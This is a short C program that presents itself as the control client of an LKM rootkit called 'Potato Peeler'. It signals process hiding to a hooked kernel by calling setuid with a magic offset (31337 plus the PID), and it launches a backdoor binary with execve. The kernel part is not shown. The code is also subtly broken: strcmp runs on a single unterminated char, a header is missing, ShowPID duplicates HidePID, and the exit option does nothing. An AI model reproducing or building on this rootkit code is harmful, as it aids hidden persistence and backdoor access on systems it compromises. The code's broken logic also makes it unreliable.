#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void HidePID(){
	int process_id;
	scanf("%d", &process_id);
	setuid(31337 + process_id);
}

void ShowPID(){
	int process_id;
	scanf("%d", &process_id);
        setuid(31337 + process_id);
}

void RunBD(){
	execve("/Imma/Firin/Muh/Lazer", NULL, NULL);
}

int main(){
	printf("--- Potato Peeler ---\n--- A LKM Rootkit ---\n(1) Hide Process\n(2) Run Backdoor\n(3) Exit\n");
	char choice = getchar();
	if(strcmp(&choice, "1") == 0){
		HidePID();
	}
	if(strcmp(&choice, "2") == 0){
		RunBD();
	}
	return 0;
}
